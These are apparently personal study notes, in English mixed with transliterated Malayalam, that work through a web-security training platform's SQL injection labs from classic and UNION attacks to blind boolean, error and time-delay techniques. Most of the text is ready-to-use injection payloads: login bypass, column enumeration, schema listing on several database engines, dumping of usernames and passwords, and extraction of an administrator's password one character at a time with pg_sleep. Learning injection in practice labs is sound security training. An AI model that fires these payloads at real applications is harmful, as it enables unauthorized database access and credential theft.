sql-classic and blind 
classic-error and union based
blind-boolean and time based

----------------------------------------------------------
==SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.== It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.**In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.**

==note - ethengilum oru database il ninum enthengilum retrieve chyunna page il aanen thonunu ee paripadi okke oppikendath==
==note ' enn symbol itt noki venam sql i undo enn nokan.internal server error enno matto oke rosponse kanan sathikum==__athupole ' ' oru qoute um koodi itt close chyth noki send chyuka apol error kanikila same page varukayum chyum.__ 

----------------------------------------------------------------
                                     intro:
-->sql il "--"" means commen        
                       (ie. ....?products=gifts'-- or ...prducts=gifts'+OR+1=1-- )
					   
-->oru normal login il query nokam
    SELECT * FROM users WHERE username= 'josu' AND password= 'michal'
	so attaker can do sql injection here by giving :
                          username : josu'--           so the query will be:
	SELECT * FROM users WHERE username= 'josu'-- (baki bagam commented aayi)
	**ivide users ennath oru table aan.* means everything**
    -------------------------------------------------------------------------------------
==**union**== --> database ile mattu tables okke retrieve chyan use chyan

--------------------------------------------------------------------

                               LAB-1 (## Retrieving hidden data)
											================
											
-->GET /filter?category='+OR+1=1-- HTTP/1.1
ivide category enna parameteril '+OR+1=1-- koduthal mathi

--------------------------------------------------------------------

                                  Lab-2(## Subverting application logic)
						              =========================
									  
--> evide oru login form und avide administrator aayi password ilathe login chyanam.so:
                           username : administrator'--
						   password : test
Query :SELECT * FROM users WHERE username = 'administrator'--' AND password =' '

--------------------------------------------------------------------

                     Lab-3 (## Retrieving data from other database tables)
					       =======================================
	Lab-3.a(Theory):	 
-->In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database. This is done using the `UNION` keyword, which lets you execute an additional `SELECT` query and append the results to the original query.

#### SQL injection UNION attacks
-->The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query. For example:
        ==SELECT a, b FROM table1 UNION SELECT c, d FROM table2==
This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

-->For a `UNION` query to work, two key requirements must be met:
-   The individual queries must return the same number of columns.
-   The data types in each column must be compatible between the individual queries.
   means:
-   How many columns are being returned from the original query?
-   Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
-   nammal chyuna sql injection il error applicationil kanichal UNION chyth nokam

#### Determining the number of columns required in an SQL injection UNION attack
-->nammal chyuna sql injection il error applicationil kanichal UNION chyth nokam.==The first step of such an attack is to determine the number of columns that are being returned by the query==.
-->When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.
1) The first method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
            ' ORDER BY 1--    (ie,     '+ORDER+BY+1--)
			' ORDER BY 2--                     (ith column kandupikan aan  cloumn(vertical))
			' ORDER BY 3--       etc.
namml column names ariyanga index arinja mathi.index exeed aayal:
   **`The ORDER BY position number 3 is out of range of the number of items in the select list`**  een site il kanichekam.chilapo oru errorum kanichilen veram.

2) The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of `null` values:
             ' UNION SELECT NULL--           (ie,   '+UNION+SELECT+NULL-- )
			 ' UNION SELECT NULL,NULL-- 
			 ' UNION SELECT NULL,NULL,NULL--        ...etc
	-->On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:
	           -->' UNION SELECT NULL FROM DUAL--
-->If the number of nulls does not match the number of columns, the database returns an error, such as:
   **`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists`**
-->On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.athayath -- ittathinushesham space nirbandamayum idanam

==NOTE :==
```
table 1            table 2
      a | b               c | d
      -----              -------
      1 , 2               3 , 4
      5 , 6               7 , 8

1) query ->  select a,b from table 1             ( athayath table 1 ile columns a and b il ninum sathanam retrieve chyuka )
   ivide a and b cloumns aan. athile values retireve chyumbol result :
   1 , 2
   5 , 6
2) union query -> select a,b from table 1 UNION select c,d from table 2
   ivide rand table il ninum namal UNION opertor vazhi retrieve chyunu.so result :
   1 , 2
   3 , 4
   5 , 6
   7 , 8
ivide table 1 ile a ine usernames and b ine passwords column aayi kandalmathi apo kathikolum.so oro column ilum athintethaya values undakum.
->so namuk ingane hack chyanengil aadyam namal specify chyuna table il ethra columns unden ariyanam.athinu namal null,null allengil orderby 1..2.  ithil ethengilum chyth nokanam ok.
   
```
    
       Lab-3.a (SQL injection UNION attack, determining the number of columns)
	          ====================================================
-->aadyam category parameter il ='  oru qoute itt nokuka apol application break aayi
-->so ini ='--   itt (no-space)  chythapol baki sql code comment aayi.so application 200 status code thanu.so ithinartham sql injection correct aayi nadakunund ennan ok
-->GET /filter?category=5'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
    ivide category enna parameteril aan ethra column und enn nokiyath
-->ivide namal NULL
-->order by cluse upayogichum namuk columns nokan :
-->GET /filter?category=5'+ORDERBY+1--    itt test chyuka.enit iterate chythal mathi

--------------------------------------------------------------------
 
     lab-3.b(Theory):
  
####  Finding columns with a useful data type in an SQL injection UNION attack:
-->Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
-->Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
              '+UNION+SELECT+'a',NULL,NULL,NULL--         (dont forget to add +)
			  ' UNION SELECT NULL,'a',NULL,NULL-- 
			  ' UNION SELECT NULL,NULL,'a',NULL-- 
			  ' UNION SELECT NULL,NULL,NULL,'a'--
      ==ingne eth column il aan string support chyunath enn ariyan patum==
-->If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:
   **`Conversion failed when converting the varchar value 'a' to data type int`**
   
                Lab-3.b (practical-finding column that contain string in it 
				        ==========================================
		
-->first we need to find how many columns are there
          -->category='+UNION+SELECT+NULL--
-->second we need to find the column that contains string in it:
           -->category=' UNION SELECT NULL,'josu',NULL--
-->ivide randamathe coloumn mathraman string

=======================================================

         Lab-3.c(theory):
		 
####  Using an SQL injection UNION attack to retrieve interesting data:
-->When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
-->athava oru table il 2 column und.athil randilum string type aanengil:
          -->'+UNION+SELECT+username, password+FROM+users--
NOTE: ivide column name,table name correct aayit thanne kodukanam

        Lab-3.c(practical-retreiving data from table)
		         ===============================
first we need to find how many columns are there
          -->'+UNION+SELECT+NULL--
second we need to find the column that contains string in it:
           -->' UNION SELECT NULL,'josu',NULL--
third we need to retrive username and password from users table:
           -->'+UNION+SELECT+username,password+FROM+users--
-->==oru karyam sredhikuka namal matoru table il (users)ninuman usernmae and passwords dump chyunath.so ingane chyumbol rand column thane aayirikanam currently ulla table il undayirikendath athupole columns randum string aayirikanam ok.ini athava oru column mathrame string support chyunenil ath adutha lab il nokiyal mathi ok.==
		
--------------------------------------------------------------------

                Lab-3.d(theory):
#### Retrieving multiple values within a single column:
-->multiple values oru column aayi aan result tharunathengil namuk athine concatenate chyth distinguish chyam like ||'~''|| (oracle il ingane chyam)
      -->'+UNION+SELECT+username+|| '~' ||+password+FROM+users--

           Lab-3.d(practical-retrievng multiple value in a single column)
		                   ===============================
 first we need to find how many columns are there
          -->'+UNION+SELECT+NULL,NULL--                     (2 column
second we need to find the column that contains string in it:
           -->'+UNION+SELECT+NULL,'abcor123'--     (2 column only contain num/text)
third we need to retrive username and password from users table:
           -->'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
     ivide aadyathe column il alla marich randamathe column il ninum aan namuk username,password kitunath.ath verthirkan aan namma aa symbol use chythath
-->Note that different databases use different syntax to perform string concatenation
	 
--------------------------------------------------------------------

          Lab-4 (## Examining the database):
	           ======================
     Lab-4.a(theory):
-->When exploiting SQL injectionvulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.
#### Querying the database type and version:
-->Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.
                 
				 --Microsoft, MySQL = @@version
			     --Oracle=SELECT banner FROM v$version   SELECT version FROM v$instance
				 --PostgreSQL= version()
-->For example, you could use a `UNION` attack with the following input:
        -->' UNION SELECT @@version--
		
        Lab-4.a(practical-querying-database-version-oracle):
-->On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
-->There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual.ivide dual maati v$version,v$instance idanam(ee tables in ninuman version kandupidikunath)
--> first we need to find how many columns are there
          -->'+UNION+SELECT+NULL,NULL+FROM+dual--     (2 column
second we need to find the column that contains string in it:
           -->'+UNION+SELECT+'josu','josu'+FROM+dual--
third we need to know the version of Database:
           -->'+UNION+SELECT+NULL,BANNER+FROM+v$version--                 OR
		   -->'+UNION+SELECT+BANNER,NULL+FROM+v$version--

       Lab-4.a(practical-querying-database-version-MySql,microsoft):
-->namuk ariyam microsoft,mysql inte verision nokunath -- @@verion
-->comment -     # or --
-->--> first we need to find how many columns are there
          -->'+ORDER+BY+2# HTTP/1.1a       
second we need to find the column that contains string in it:
           -->'+UNION+SELECT+'josu','josu'# HTTP/1.1
third we need to know the version of the database:
           -->'+UNION+SELECT+'josu',@@version# HTTP/1.1
		   
    lab-4.b(Theory)
#### Listing the contents of the database:
-->Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
-->We can query `information_schema.tables` to list the tables in the database:                                 -->SELECT+*+FROM+information_schema.tables
-->You can then query `information_schema.columns` to list the columns in individual tables:
       -->SELECT * FROM information_schema.columns WHERE table_name = 'Users'
	   
    Lab-4.b(practical-Listing the database contents on non oracle databeses):
-->first ethra column und enn kandupidikanam:
      -->'+ORDER+BY+2--                      (randenam udn)
-->second which column contain text data:
       -->'+UNION+SELECT+'abc','def'--                (2 ilum aakum)
-->Database ile contents dumb chyunathin mumb ath eth DB aanen urapp varuthanam ennale baki queries athinanusarich chyan patoo.for eg:
    -->'+UNION+SELECT+version()s,NULL--          (so ivide postgrsql aan)
-->Use the following payload to retrieve the list of tables in the database:   
    -->'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
	  ivide tables kandethi athil ninum namuk venda table eduth athile column kandethunu.ee table_name engane kiti enal google->information_schema.tables postgresql column enn adich noki defualt aaya tables enthanen nokanam ok.
-->Find the name of the table containing user credentials.
-->Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
>'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--   
-->Find the names of the columns containing usernames and passwords.
-->Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    -->'+UNION+SELECT+username_abcdef,password_abcdef+FROM+users_abcdef--
ivide ninum admin,password kitum

--------------------------------------------------------------
#### listing the contents on oracle database:
-->On Oracle, you can obtain the same information with slightly different queries.
-->You can list tables by querying all_tables:
       -->SELECT * FROM all_tables
-->And you can list columns by querying all_tab_columns:
     -->SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
	 
	   lab-4.b(practica-Listing the contents on database oracle):
-->first catagory=parameteril '  itt nokuka apol internal server error enno mato kanam apo manasilakuka sql injection vulnerable aanen ok.
-->ini ethra column und enn nokanam:
     -->'+ORDER+BY+2--                         (randenam und)
-->rand column intem type nokanam:
       -->'+UNION+SELECT+'a','a'+FROM+DUAL--     (randilum text aakum)
-->ini database ethan enn nokanam.so mumb chythapole version nokanam.
-->ini output the list of tables in the database:
          so google il poi oracle column names nokuka.athil kanuna name edukuka(ie table_name).athupole cheatsheetil nokiya kanam all_tables enn kodukanam.
         -->'+UNION+SELECT+table_name,NULL+FROM+all_tables--
		    ipol namuk table name kandethi.ini column name kandethanam.namuk vendath users ennath varuna table name aan ok.
-->ini output the column names of the users table:
  -->google oracle column names
>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WALIWF'--(cheatsheet il ninum ith kanan patum)
  -->ivide namuk rand column kitum
-->ini output the list of usernames and passwords:
>'+UNION+SELECT+PASSWORD_XXGRFT,USERNAME_SNIABH+FROM+USERS_WALIWF--
   -->ivide namuk admin,password kitum
   
   -----------------------------------------------------------------
   
                       Lab-5(## Blind SQL injection vulnerabilities)
			                 ===================================
		
-->The application does not return the results of the SQL query or the details of any database errors within its responses.
-->Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.
-->Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
-->ivide response onum kanan pattathath kond thanne UNION type attack onum nadakila.

####  Exploiting blind SQL injection by triggering conditional responses:
  oru example ilude padikam
-->oru app cokkies use chyth trac chyunu
         -->Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
-->When a request containing a `TrackingId` cookie is processed:
    -->SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'    ingane aayirikum query undavuka.
-->nammal cookie header il cookie k shesham =='+and+1=1--== enn itt test chyth nokuka.(= enath chlepo url encode chyanamayirikum)
       
    Lab-5.a(practical-Blind SQL injection with conditional responses):

-->ivide conditional(true/false) aaya karyangal use chyumbol work aavunund.so athukondnammal 1=1 oke use chyth oron kandupidikunu
-->firsrt confirm the param is vulnerable to blind sql i
-->ivide cookie parameteril aan test chyendath
         -->cookie'+and+1=1-- itt nokuka.ok aanenkil blind sql i und
-->second confirm that we have a users table:
    -->'+and+(select+'x'+from+users+LIMIT+1)='x'--            (yes it exist)
-->athayath ith sheriyanengil x=x varum(karanam query nok users enna table undengil x enna letter output chyanam ennan query) so true kanikum apol welcome back enna maessage site il varum so angane namuk manasilakam users enna table und enn.
-->third confirm that username administrator exist in the users table:
     -->'+and+(select+username+from+users+where+username='administrator')
               ='administrator'--    (better url encode on burp before clicking send)
     ivide namuk welcome back enn kanam which means administrator enna username und.
	 nammal chyunath correct aano enn ariyan "wlcome back" enna msg varunundo enn nokiya mathi
-->fourth enumerate the lenth of the password of the administrator:
-->'+and+(select+username+from+users+where+username='administrator'+and+
      LENGTH(password)>1)='administrator'--;     (url encode chyuka)
-->ingnae oro query kazhinj 1 ullath mati 2,3,4,... ignane kodukuka enit avasanam length kazhinjal ath administrator umayi equal aakila apol namuk manasilakam lenght athrem aan ullathen ok
-->ee saththanam nammal burp intruderil itt brute force chyth nokanam.apol ariyan patum password inte correct length.ok.ipol length masasilayi ini charecters nokam
-->'+and+(select+substring(password,1,1)+from+users+where+username=
     'administrator')='a'--;                (Note oracle il substr mathrame uloo)
	==NOTE:ivide password,1,1 ile first 1 ennath onamathe charecter 'a' aano enn nokunathan.aanengil-password,2,1 itt mattoru letter nokanam.ok==
-->ivide 'a' enna sthalam nammal brute force chyunu angane namuk oro passwd charectersum kandupidikam.angane namuk admin nte full passwd kitum.

####  Inducing conditional responses by triggering SQL errors:
-->ivide nerthe pole condiitonal aaya response vech karyangal chyan pattila






       Lab-5.b(practical-Blind SQL injection with conditional errors):
-->aadyam ' single qoute itt sql i undon nokuka.athupole oru qoute koodi itt ath close chyth error varunundo enn nokuka.
-->'+||+(select+' ')+||+' itt nokuka 
-->oracle db aanengil '+||+(select+' '+from+dual)+||+'     itt nokuka 







#### Exploiting blind SQL injection by triggering time delays:
-->ivide time delay undakunathtan padipikunath

          Lab-5.c(practical-blind sql i with time delays):
-->nammal sql i eth parameteril varum enn kandupidikanam.ivide tracking-id cookie aan
-->so time delay undakanamenki eth database aan enn manasilakanam(cheatsheet).
        -->'+||+(SELECT+pg_sleep(10))--    
		
	Lab-5.d(practical-Blind SQLi with time delays and information retrieval)
	
-->first we need to confirm the parameter is vulnerable to sql i
    -->use '  ,-->use '+||+pg_sleep(5)--
-->second confirm that the users table exist in the database.so athinayi nammal time delay vekunu.so if time delay aakunengi exist allengil alla enna reethiyil aakiyamathi
   -->'+||+(select+case+when+(1=1)+then+pg_sleep(10)+else+pg_sleep(-1)+end)--;
-->ini administrator enna username undon nokam:
   -->'+||+(select+case+when+(username='administrator')+then+pg_sleep(10)+else+
        pg_sleep(-1)+end+from+users)--;
		ivide users enna tablil administrator enna username undon nokunu.so ee query 10 second sleep akunundenki true aan
-->ini namuk password enumerate chyam.first passwd length enumerate chyam:
     -->'+||+(select+case+when+(username='administrator'+and+LENGTH
	 (password)>25)+then+pg_sleep(10)+else+pg_sleep(-1)+end+from+users)--;
	 -->ivide 10 second delay ila so athinartham passwd length 25 nekal kuravan.ith nammal nerethe chythathpole bruteforce chyth kandupidikam
-->ipol passwd length kiti ini passwd charecters kandupidikam:
   --> '+||+(select+case+when+(username='administrator'+
and+substring(password,1,1)='a')+then+pg_sleep(10)+else+pg_sleep(-1)+end+from+users--;
-->ini nerthe pole bruteforce chyth password kandupidikuka.ok
